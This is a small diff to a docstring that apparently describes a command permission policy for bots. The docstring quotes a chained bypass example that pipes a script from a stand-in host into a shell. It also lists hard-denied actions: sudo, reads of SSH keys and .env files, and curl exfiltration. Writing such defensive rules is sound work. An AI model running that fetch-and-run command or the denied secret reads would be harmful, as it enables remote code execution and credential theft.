@@ -7,7 +7,7 @@ docs/research/complaints.md):
   matching rules, because allowlist bypass via chaining
   (``git status && curl evil.sh | sh``) was a year-old unfixed bug elsewhere.
 - Escalation (sudo), secret reads (~/.ssh, .env), pipe-to-interpreter and
-  outbound exfil channels (``| curl``) are hard-denied — bots never need them.
+  outbound exfil channels (``| curl``) are hard-denied, bots never need them.
 - Workspace-relative destructive ops (``rm -rf build/``) are "ask", with a
   sticky per-bot allow so supervision stays bearable instead of being disabled.
 """
